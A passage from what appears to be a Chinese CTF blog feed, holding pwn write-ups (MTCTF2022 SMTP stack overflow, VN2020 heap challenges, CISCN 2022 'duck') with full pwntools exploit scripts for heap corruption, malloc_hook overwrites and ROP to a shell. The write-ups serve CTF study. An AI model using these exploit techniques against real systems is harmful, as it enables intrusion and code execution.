class="comment">#flag&#123;2cc46b7a-67ab-47a0-9575-7bd938da3ad6&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="stmp"><a href="#stmp" class="headerlink" title="stmp"></a>stmp</h1><p>一道stmp协议题</p>
<p>漏洞在<code>sender_worker</code>函数中</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100917117.PNG"></p>
<p>a1的长度大于0xff即可进行一次strcpy，经过调试可以发现a1为输入的RCPT TO:所拼接的字符串，这里是我们可控的，所以只要进入这里就可以进行栈溢出了</p>
<p>要进入这个函数也只需要在输入完data之后即可</p>
<p>接下来构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10c</span> + <span class="number">4</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>此时会发现函数返回地址虽然被覆盖了，但是程序提前crash了，而不是执行到我们的返回地址</p>
<p>跟进去调试</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100917401.png" alt="image-20220930154304212"></p>
<p>从这里可以知道ebp - 0xc的位置应该填充为一个可访问的地址</p>
<p>更新payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p32(<span class="number">0x8049024</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + <span class="string">b&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100917637.png" alt="image-20220930155044508"></p>
<p>成功执行到返回地址</p>
<p>接下来就是尝试拿shell或者想办法输出flag了，这里构造rop getshell是不可能的，因为泄露的libc地址只会在服务端输出</p>
<p>我们利用popen函数 + 重定向来获得flag</p>
<p>popen函数可以执行任意命令，只需要构造payload让程序执行<code>popen(&#39;cat flag &gt;&amp; 5&#39;, &#39;r&#39;)</code>即可获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;220 SMTP tsmtp&#x27;</span>, <span class="string">b&#x27;HELO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mailfrom</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;MAIL FROM:&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RCPT</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;RCPT TO:&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DATA</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;DATA&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">END</span>():</span><br><span class="line">    sl(<span class="string">b&#x27;.\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hello()</span><br><span class="line">mailfrom(<span class="string">b&#x27;cat flag &gt;&amp;5&#x27;</span>)</span><br><span class="line">a = elf.search(<span class="string">b&#x27;r\x00&#x27;</span>).__next__() <span class="comment">#b&#x27;r\x00&#x27;</span></span><br><span class="line">bss = <span class="number">0x804D140</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p32(<span class="number">0x8049024</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(elf.plt[<span class="string">&#x27;popen&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(bss) + p32(a)</span><br><span class="line">RCPT(payload)</span><br><span class="line">DATA(<span class="string">b&#x27;bbbbb&#x27;</span>)</span><br><span class="line">END()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100918148.png" alt="image-20220930161338873"></p>
<p>成功获得flag</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>MTCTF2022</tag>
      </tags>
  </entry>
  <entry>
    <title>VN2020公开赛-pwn</title>
    <url>/2022/06/26/VN2020%E5%85%AC%E5%BC%80%E8%B5%9B-pwn/</url>
    <content><![CDATA[<p>VN2020公开赛部分pwn题复现</p>
<span id="more"></span>

<h1 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><a href="https://imgtu.com/i/jAMZlQ"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100920391.jpg" alt="jAMZlQ.jpg"></a></p>
<p><a href="https://imgtu.com/i/jAQLxe"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100920544.jpg" alt="jAQLxe.jpg"></a></p>
<p><a href="https://imgtu.com/i/jAQzVI"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100920089.jpg" alt="jAQzVI.jpg"></a></p>
<p>程序限制了最多只能申请十个堆块，且size最大为111</p>
<p>在编辑堆块内容的函数中对for循环的边界检查不当，造成off by one</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用off by one改相邻chunk的size域达到堆块重叠泄露libc，再利用堆块重叠完成fast bin attack改写malloc_hook</p>
<ol>
<li>先创建四个堆块，chunk0为0x18，chunk1和chunk2为0x60，chunk3为0x10防止top chunk合并</li>
<li>编辑chunk0改写chunk1的size为0x70 * 2 +1即0xe1，这样chunk2就和chunk1重叠了</li>
<li>释放chunk1进入unsorted bin中，再申请0x60的chunk，将原先0x60大小的chunk从unsorted bin中切割出来，此时unsorted bin中只剩下chunk2，show(2) 即可泄露libc</li>
<li>再申请0x60将unsorted bin清空，再申请4个堆块用来完成fast bin attack</li>
<li>编辑chunk5改写chunk6的size域，再做一个堆重叠，这里要注意next chunk的伪造</li>
<li>把chunk6释放掉再申请回来就能编辑到chunk7的fd指针了</li>
<li>改malloc_hook为one_gadget</li>
</ol>
<p>把所有one_gadget都试了一遍，发现失败了，这里参考这篇<a href="https://blog.csdn.net/Maxmalloc/article/details/102535427">文章</a></p>
<p>利用realloc来调整堆栈，再getshell</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25706</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con = <span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">malloc_hook = uu64() - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - <span class="number">0x3C4B10</span></span><br><span class="line">one = libcbase + <span class="number">0x4526a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)   <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x51</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">11</span> + p64(one) + p64(libcbase + <span class="number">0x846C0</span> + <span class="number">0xc</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;size?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="easyTHeap"><a href="#easyTHeap" class="headerlink" title="easyTHeap"></a>easyTHeap</h1><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p><a href="https://imgtu.com/i/jAb62j"><img src="/home/leof/tmp/blog/source/_posts/jAb62j-1681089638359-7.jpg" alt="jAb62j.jpg"></a></p>
<p><a href="https://imgtu.com/i/jAbjZ6"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100920170.jpeg" alt="jAbjZ6.jpg"></a></p>
<p>free之后指针没有置零，uaf，限制了free次数为3次</p>
<p><a href="https://imgtu.com/i/jAqZo8"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100920268.jpg" alt="jAqZo8.jpg"></a></p>
<p>只能申请7个堆块，最大为0x100</p>
<h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>double free拿到tcache struct，将所有tcache的count位填满，再free一个unsorted bin大小的堆块即可泄露libc，至此free次数以用完</li>
<li>编辑tcache改几个链表头打malloc_hook即可</li>
</ol>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27435</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span> - <span class="number">0x250</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#3 tcache</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">malloc_hook = uu64() - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - <span class="number">0x3EBC30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">one = libcbase + <span class="number">0x4f322</span></span><br><span class="line">realloc = libcbase + <span class="number">0x98C30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(malloc_hook - <span class="number">0x13</span>) * <span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x40</span>)   <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">11</span>+ p64(one) + p64(realloc + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>VN2020</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn-2022-华东北赛区pwn题复现</title>
    <url>/2022/06/29/ciscn-2022-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BApwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>ciscn2022 华东北赛区pwn题复现</p>
<span id="more"></span>

<h1 id="duck"><a href="#duck" class="headerlink" title="duck"></a>duck</h1><p>2.34 uaf , 打environ泄露栈地址，覆盖返回地址为system(“&#x2F;bin&#x2F;sh”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28060</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()               <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">96</span> - libc.sym[<span class="string">&#x27;main_arena&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sh = libcbase + <span class="number">0x1B4689</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2daa2</span></span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()               <span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">8</span>, p64(environ ^ key))</span><br><span class="line">add()   <span class="comment">#14</span></span><br><span class="line">add()   <span class="comment">#15 environ</span></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">stack = uu64() - <span class="number">0x150</span>      <span class="comment">#ret_addr</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(stack - <span class="number">0x18</span> ^ key))</span><br><span class="line"></span><br><span class="line">add() <span class="comment">#16</span></span><br><span class="line">add()   <span class="comment">#17 ret_addr</span></span><br><span class="line">edit(<span class="number">17</span>, <span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_rdi) + p64(sh) + p64(sys_addr))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="bigduck"><a href="#bigduck" class="headerlink" title="bigduck"></a>bigduck</h1><p>2.33 uaf ,同样打environ泄露栈地址，覆盖返回地址构造orw</p>
